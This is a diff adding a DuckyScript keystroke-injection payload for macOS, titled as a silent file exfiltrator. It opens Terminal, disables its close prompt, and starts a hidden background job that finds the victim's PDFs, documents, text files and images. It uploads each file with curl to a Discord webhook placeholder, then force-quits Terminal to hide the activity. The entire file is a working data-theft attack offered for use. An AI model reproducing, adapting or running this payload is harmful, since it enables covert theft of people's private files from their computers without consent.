@@ -1,0 +1,38 @@
+REM Title: Silent File Exfiltrator using Discord Webhooks - MacOS
+REM Author: itsOwen
+REM Target: MacOS
+REM Version: 1.0
+DELAY 2000
+GUI SPACE
+DELAY 1000
+STRING terminal
+DELAY 1000
+ENTER
+DELAY 1000
+REM Disable Terminal close prompt permanently
+STRING defaults write com.apple.Terminal PromptOnClose -bool false
+ENTER
+DELAY 500
+REM Create a silent background process
+STRING nohup /bin/bash -c '
+ENTER
+STRING cd ~/Desktop && 
+ENTER
+STRING mkdir -p .temp_collect && 
+ENTER
+STRING cd .temp_collect && 
+ENTER
+STRING find ~/ -type f \( -name "*.pdf" -o -name "*.doc" -o -name "*.docx" -o -name "*.txt" -o -name "*.jpg" -o -name "*.png" \) -size -8M -maxdepth 3 -exec curl -s -F "file=@{}" https://discord.com/api/webhooks/WEBHOOK_HERE \; && 
+ENTER
+STRING cd .. && 
+ENTER
+STRING rm -rf .temp_collect
+ENTER
+STRING ' > /dev/null 2>&1 &
+ENTER
+DELAY 500
+REM Force quit Terminal without prompts
+STRING osascript -e 'tell application "Terminal" to quit without saving'
+ENTER
+DELAY 500
+ENTER
